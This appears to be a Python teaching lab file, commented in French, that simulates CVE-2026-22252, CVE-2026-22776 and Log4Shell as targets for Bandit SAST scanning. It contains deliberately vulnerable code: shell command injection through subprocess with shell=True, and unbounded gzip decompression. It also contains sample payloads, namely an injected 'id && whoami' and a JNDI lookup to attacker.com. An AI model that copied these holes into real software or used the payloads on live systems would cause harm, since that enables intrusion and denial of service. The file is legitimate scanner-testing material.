"""
VULNERABLE LAB FILE – NVD CVE SIMULATIONS
----------------------------------------

Simulations pédagogiques des CVE suivantes :
- CVE-2026-22252 (LibreChat) – RCE
- CVE-2026-22776 (cpp-httplib) – DoS
- CVE-2021-44228 (Log4Shell) – RCE

Objectif :
- Scan SAST (Bandit)
- Mapping CVE / CWE / NVD
"""

import subprocess
import json
import gzip
import logging
import sys

# ==========================================================
# 🔴 CVE-2026-22252 — LibreChat (RCE)
# CWE-78: OS Command Injection
# Bandit: B602, B605
# ==========================================================
def librechat_mcp_handler(raw_request):
    """
    Simule une API MCP stdio vulnérable
    """
    request = json.loads(raw_request)

    # ❌ aucune validation de la commande
    command = request.get("command")

    subprocess.Popen(
        command,
        shell=True,
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )


# ==========================================================
# 🔴 CVE-2026-22776 — cpp-httplib (DoS)
# CWE-400: Uncontrolled Resource Consumption
# ==========================================================
def http_compressed_request_handler(payload):
    """
    Simule une requête HTTP compressée non limitée
    """
    # ❌ aucune limite mémoire
    data = gzip.decompress(payload)

    print(f"Payload traité ({len(data)} bytes)")


# ==========================================================
# 🔴 CVE-2021-44228 — Log4Shell
# CWE-917: Expression Language Injection
# Simulation Python du pattern JNDI
# ==========================================================
def vulnerable_logger(user_input):
    """
    Simule un moteur de log vulnérable à l'interpolation
    """
    # ❌ interpolation non sécurisée
    logging.error(f"User provided value: {user_input}")


# ==========================================================
# MAIN – Exécution de démonstration
# ==========================================================
if __name__ == "__main__":
    logging.basicConfig(level=logging.ERROR)

    print("[+] Simulation CVE-2026-22252")
    librechat_mcp_handler(json.dumps({
        "command": "id && whoami"
    }))

    print("[+] Simulation CVE-2026-22776")
    huge_payload = gzip.compress(b"A" * 50_000_000)
    http_compressed_request_handler(huge_payload)

    print("[+] Simulation CVE-2021-44228")
    vulnerable_logger("${jndi:ldap://attacker.com/a}")
